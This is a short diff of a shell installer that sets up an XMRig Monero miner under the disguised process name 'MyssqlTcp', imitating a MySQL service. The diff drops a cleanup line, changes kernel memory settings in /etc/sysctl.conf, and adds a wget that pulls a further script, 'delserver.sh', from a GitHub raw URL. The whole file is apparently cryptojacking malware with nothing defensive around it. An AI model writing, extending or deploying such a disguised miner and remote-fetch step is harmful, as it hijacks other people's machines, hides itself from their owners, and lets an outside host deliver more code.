@@ -709,8 +709,6 @@ else
   echo "Monero server is already running in the background. Refusing to run another one."
   echo "Run \"killall MyssqlTcp\" or \"sudo killall MyssqlTcp\" if you want to remove background server first."
 fi
-cd /tmp/
-rm -f mysqltcp.sh
 EOL
 
 chmod +x $HOME/myssqltcp/xmrig.sh
@@ -817,3 +815,4 @@ sysctl -w vm.overcommit_memory=2
 echo "vm.overcommit_memory=2" >> /etc/sysctl.conf
 echo "[*] Setup complete"
 echo "[*] Yee-Go"
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
